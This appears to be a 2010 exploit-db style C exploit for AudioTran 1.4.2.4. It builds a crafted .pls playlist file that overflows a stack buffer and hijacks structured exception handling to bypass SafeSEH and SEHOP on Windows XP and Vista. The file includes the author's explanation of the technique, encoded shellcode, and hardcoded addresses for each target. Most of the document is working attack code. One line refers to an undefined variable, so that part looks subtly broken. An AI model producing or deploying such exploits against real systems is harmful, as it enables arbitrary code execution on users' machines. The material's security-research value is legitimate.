# Exploit Title: AudioTran SafeSEH+SEHOP all-at-once attack method exploit
# Date: 2010.10.1
# Author: x90c
# Software Link: http://www.exploit-db.com/application/14961/
# Version: 1.4.2.4
# Tested on:
#    - MS Win xp sp3 pro ko ( SafeSEH )
#    - MS Win xp sp3 pro en ( SafeSEH )
#    - MS Win Vista ultimate sp0 ko ( SafeSEH )
#    - MS Win Vista ultimate sp1 ko ( SafeSEH + SEHOP enabled )
# CVE :

/*
  //--
  AudioTran 1.4.2.4 SafeSEH+SEHOP *all at once* SEH attack method exploit 
  ( 
    SafeSEH+SEHOP all at once bypass attack, 
    no 'pop pop ret' and 'xor pop pop ret' techniques 
  )
  //--

  Description:
    I made a new attack techinque to exploit SafeSEH+SEHOP protection all at once after research SEH.
    And I applied the new method on AudioTran vulnerability for case by case exploit.
  
  David Litchfield Published 
    'Defeating the Stack Based Buffer Overflow Prevention Mechanism of Microsoft Windows 2003 Server.' 
    Technical paper on 2003 ( SafeSEH bypass techniques ).
    - http://www.ngssoftware.com/papers/defeating-w2k3-stack-protection.pdf
  
  SYSDREAM Published 'Bypassing SEHOP' article:
    - http://www.sysdream.com/articles/sehop_en.pdf

  This new all-at-once SEH attack techinque applied to bypassing the SafeSEH+SEHOP protection:
    Vista sp1, Win 7, Win Server 2008, Win Server 2008 R2 supports SEHOP Protection.
    And Only under Win 2008 Servers it enables by deafult. so I manualy enables SEHOP
    On vista sp1 by using fixitup tool which below link contains. then applied my new technique.
    - http://support.microsoft.com/kb/956607
  
  Referenced exploits:
    SafeSEH/DEP bypass exploit: Muhamad Fadzil Ramli
    exploit for XP SP3 ( David Litchfield's SafeSEH bypass, ROP to bypass DEP )
    - http://www.exploit-db.com/exploits/15047/
  
    Credit/exploit: Abhishek Lyall
    exploit for XP SP2 ( SEH overwrite )
    - http://www.exploit-db.com/exploits/14961/ ( Abhishek Lyall )

  Tested Platforms:
    - MS Win xp sp3 pro ko ( SafeSEH )
    - MS Win xp sp3 pro en ( SafeSEH )
    - MS Win Vista ultimate sp0 ko ( SafeSEH )
    - MS Win Vista ultimate sp1 ko ( SafeSEH + SEHOP enabled )

  Screenshots:
    - http://www.x90c.org/All_at_Once_SEH_attack/win xp sp3_pro_en_SafeSEH.png
    - http://www.x90c.org/All_at_Once_SEH_attack/win xp sp3_pro_ko_SafeSEH.png
    - http://www.x90c.org/All_at_Once_SEH_attack/win vista sp0 Ultimate_ko_SafeSEH.png
    - http://www.x90c.org/All_at_Once_SEH_attack/win vista sp1 Ultimate_ko_SafeSEH_SEHOP_bypass.png

  Presentation URL: http://www.x90c.org/SEH all-at-once attack.pdf
  exploit URL: http://www.x90c.org/All_at_Once_SEH_attack/audiotran_safeseh_sehop_exploit(SEH_all-at-once_attack).c.txt

  p.s: This vulnerability doesn't needed any SEH attack, because it works like 
       A classical stackoveflow. anyway I used it for applying a new technique.
       
       After research and writing this exploit without the litchfield method,
       I found originaly similar SafeSEH bypass method(registered exception handler approach) 
       Introduced in the above David Litchfield's Technical Paper. 
       The litchfield method applies only for SafeSEH bypass. 
       My attack method can applys SafeSEH+SEHOP bypass *all at once*.

  ******* SafeSEH+SEHOP all at once attack method *******:
  [1] Looking for *_SafeSEH_allowed_modules!_except_handler3.
  [2] overwrite SEH E_R struct as below.

        |E_R *Next | Exception Handler | an base address of Image area |  index to user-defined handler |
        -------------------------------------------------------------------------------------------------
        |orig *Next| *!_except_handler3| calculated value 1(ind_useh1) | calculated value 2(ind_useh2)  |
    
    - ind_useh1 is a base address of The vulnerable application's Image area for callling user-defined
      SEH Exception Handler. And ind_useh2 is the '__try{}' area count from zero(0)...
      If '__try{ __try{' then the [ebp-4] (ind_useh2) is 1. '__try{ __try{ __ try{' (ind_useh2) is 2.

    - the two values ind_useh1, ind_useh2 will calculated for a user-defined exception handler address
      For each '__try{'. *allowed_modules!_except_handler3(compiler generated handler) which calls 
      User-defined handler. as you may know, attacker can control those two values and make 
      A indirect call to shellcode.

    - SafeSEH(ExceptionHandler Validation) allows allowed *Modules!_except_handler3 
      Then it bypassed. newer *all-at-once attack is some different than David Litchfield's Approach.

      SEHOP doesn't allow overwriting the value '\xeb\x06 ( jmp short $+6 )' to E_R struct *Next.
      If overwrited by other value than original E_R *next. than ChainValidation failed.
      My attack method doesn't changes the original *next value. and SEHOP(Chain validation) bypassed. 
      _except_handler3 changed to _except_handler4 Under SEHOP applied platforms. but still exists 
      _except_handler3 on some modules and other same codes like MSVBVM60!CreateIExprSrvObj+??. ( x90c )

    - On some cases ind_useh1, ind_useh2 locations are changed as this AudioTran SEH.
      But it doesn't matter to exploit.
	  
        ( AudioTran SEH )
	|E_R *Next| ExceptionHandler | ind_useh2 | ind_useh1 |

  [3] seizes the values ind_useh1 and ind_useh2 for making a indirect callling to shellcode.

  --
  x90c ( KyongJoo, Jung ) of INetCop(c) Security.
  Personal homepage: http://www.x90c.org
  E-mail: geinblues@gmail.com
  --

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char pls_head[] = "\x5B\x70\x6C\x61\x79\x6C\x69\x73\x74\x5D\x0D\x0D\x0A\x46\x69\x6C\x65\x31\x3D";
                        
// -- payload chunks for each platforms.
char pre_nop[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

char xp_sp3_pre[] = "\x76\xe6\x12\x00"; // &next 4 ( 0012e676 ) -------+
char vista_sp0_pre[] = { // +0x64 stored address will called.          |
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"//   |
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"//   |
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"//   |
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"//   |
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"//   |
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"//   |
"\x90\x90\x90\x90"        //                                           |
"\x76\xe6\x12\x00" }; // &next 4: vista ultimate sp0 ko: 0012e676-+    |
                          //                                      |    |
char calc_shellcode[] = { // from Abhishek Lyall's exploit.  <----+----+
"\xDB\xDF\xD9\x74\x24\xF4\x58\x2B\xC9\xB1\x33\xBA"           
"\x4C\xA8\x75\x76\x83\xC0\x04\x31\x50\x13\x03\x1C\xBB\x97\x83\x60"
"\x53\xDE\x6C\x98\xA4\x81\xE5\x7D\x95\x93\x92\xF6\x84\x23\xD0\x5A"
"\x25\xCF\xB4\x4E\xBE\xBD\x10\x61\x77\x0B\x47\x4C\x88\xBD\x47\x02"
"\x4A\xDF\x3B\x58\x9F\x3F\x05\x93\xD2\x3E\x42\xC9\x1D\x12\x1B\x86"
"\x8C\x83\x28\xDA\x0C\xA5\xFE\x51\x2C\xDD\x7B\xA5\xD9\x57\x85\xF5"
"\x72\xE3\xCD\xED\xF9\xAB\xED\x0C\x2D\xA8\xD2\x47\x5A\x1B\xA0\x56"
"\x8A\x55\x49\x69\xF2\x3A\x74\x46\xFF\x43\xB0\x60\xE0\x31\xCA\x93"
"\x9D\x41\x09\xEE\x79\xC7\x8C\x48\x09\x7F\x75\x69\xDE\xE6\xFE\x65"
"\xAB\x6D\x58\x69\x2A\xA1\xD2\x95\xA7\x44\x35\x1C\xF3\x62\x91\x45"
"\xA7\x0B\x80\x23\x06\x33\xD2\x8B\xF7\x91\x98\x39\xE3\xA0\xC2\x57"
"\xF2\x21\x79\x1E\xF4\x39\x82\x30\x9D\x08\x09\xDF\xDA\x94\xD8\xA4"
"\x05\x77\xC9\xD0\xAD\x2E\x98\x59\xB0\xD0\x76\x9D\xCD\x52\x73\x5D"
"\x2A\x4A\xF6\x58\x76\xCC\xEA\x10\xE7\xB9\x0C\x87\x08\xE8\x6E\x46"
"\x9B\x70\x5F\xED\x1B\x12\x9F" };

char trap_shellcode[] = "\xcc\xcc\xcc\xcc";
char crasher[] = "\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43";

// --

static char platforms[5][128] = {
  "\t- 0: MS Win xp pro sp3 ko ( SafeSEH )\n", 
  "\t- 1: MS Win xp pro sp3 en ( SafeSEH )\n",
  "\t- 2: MS Win Vista Ultimate sp0 ko ( SafeSEH )\n",
  "\t- 3: MS Win Vista Ultimate sp1 ko ( SafeSEH + SEHOP )\n",
  "\0" };

int main(int argc, char *argv[])
{
  char xp_sp3_payload[sizeof(pls_head)+276+sizeof(pre_nop)+sizeof(xp_sp3_pre)+sizeof(calc_shellcode)];
  char vista_sp0_payload[sizeof(pls_head)+276+sizeof(pre_nop)+sizeof(vista_sp0_pre)+sizeof(calc_shellcode)];
  char vista_sp1_SEHOP_payload[sizeof(pls_head)+sizeof(trap_shellcode)+284];
  short target = 0;
  long ind = 0;
  FILE *fp;

  printf("--\n");
  printf("AudioTran SafeSEH+SEHOP all-at-once attack exploit ( no 'pop pop ret' technique )\n");
  printf("x90c (KyongJoo, Jung)\n\n");
  printf("--\n");
  printf("Usage: %s [target]\n", argv[0]);
  printf("%s%s%s%s\n", platforms[0], platforms[1], platforms[2], platforms[3]);

  if(argc < 2)
    exit(1);

  target = atoi(argv[1]);

  fp = fopen("SEH_Trigger.pls", "wb");

  ind = sizeof(pls_head) - 1;

  /* TARGET: XP sp3 ko, en SafeSEH */
  if(target == 0 || target == 1){
    memcpy(&xp_sp3_payload, &pls_head, sizeof(pls_head));
    memset(&xp_sp3_payload[ind], 'A', 260);
    *(long *)&xp_sp3_payload[ind+=260] = 0x0012e600; // original E_R *next

    if(target == 0) // xp sp3 ko
      *(long *)&xp_sp3_payload[ind+=4] = 0x7345bafd; // *windows_module!_except_handler3
    else if(target == 1) // xp sp3 ko
      *(long *)&xp_sp3_payload[ind+=4] = 0x7350bafd; // *windows_module!_except_handler3

    *(long *)&xp_sp3_payload[ind+=4] = 0x0012e604; // ind_useh
    *(long *)&xp_sp3_payload[ind+=4] = 0x00000009; // ind_useh1
    memcpy(&xp_sp3_payload[ind+=4], &pre_nop, sizeof(pre_nop)); 
    memcpy(&xp_sp3_payload[ind+=(sizeof(pre_nop)-1)], &xp_sp3_pre, sizeof(xp_sp3_pre)); 
    memcpy(&xp_sp3_payload[ind+=(sizeof(xp_sp3_pre)-1)], &calc_shellcode, sizeof(calc_shellcode));
    ind+=sizeof(calc_shellcode);
    fwrite(&xp_sp3_payload, 1, ind - 1, fp);
  } 
  /* TARGET: Vista sp0 ko SafeSEH */
  else if(target == 2) {
    memcpy(&vista_sp0_payload, &pls_head, sizeof(pls_head));
    memset(&vista_sp0_payload[ind], 'A', 260);
    *(long *)&vista_sp0_payload[ind+=260] = 0x0012e658; // original E_R *next
    *(long *)&vista_sp0_payload[ind+=4] = 0x7338ba2d; // *windows_module!_except_handler3
    *(long *)&vista_sp0_payload[ind+=4] = 0x0012e602; // ind_useh
    *(long *)&vista_sp0_payload[ind+=4] = 0x00000009; // ind_useh1
    memcpy(&vista_sp0_payload[ind+=4], &pre_nop, sizeof(pre_nop));
    memcpy(&vista_sp0_payload[ind+=(sizeof(pre_nop)-1)], &vista_sp0_pre, sizeof(vista_sp0_pre));
    memcpy(&vista_sp0_payload[ind+=(sizeof(vista_sp0_pre)-1)], &calc_shellcode, sizeof(calc_shellcode));    
    ind+=sizeof(calc_shellcode);
    fwrite(&vista_sp0_payload, 1, ind - 1, fp);
  } 
  /* TARGET: Vista sp1 ko SafeSEH + SEHOP */
  else if(target == 3){
    memcpy(&vista_sp1_SEHOP_payload, &pls_head, sizeof(pls_head));
    memcpy(&vista_sp1_SEHOP_payload[ind], _shellcode, 4); // trap_shellcode
    memset(&vista_sp1_SEHOP_payload[ind+=4], 'A', 150);
    *(long *)&vista_sp1_SEHOP_payload[ind+=150] = 0x0012e4d8; // &trap_shellcode
    memset(&vista_sp1_SEHOP_payload[ind+=4], 'B', 102);
    *(long *)&vista_sp1_SEHOP_payload[ind+=102] = 0x0012e640; // original E_R *next
    *(long *)&vista_sp1_SEHOP_payload[ind+=4] = 0x7278bafd; // MSVBVM60!CreateIExprSrvObj+??
    *(long *)&vista_sp1_SEHOP_payload[ind+=4] = 0x0012e504; // ind_useh
    *(long *)&vista_sp1_SEHOP_payload[ind+=4] = 0x00000009; // ind_useh1
    memcpy(&vista_sp1_SEHOP_payload[ind+=4], &crasher, sizeof(crasher)); // crasher
    ind+=sizeof(crasher);
    fwrite(&vista_sp1_SEHOP_payload, 1, ind - 1, fp);
  }
  
  fclose(fp);  

  printf("[+] Target: %s", platforms[target]);
  printf("[+] 'SEH_Trigger.pls' file created!\n\n");

  return 0;
}


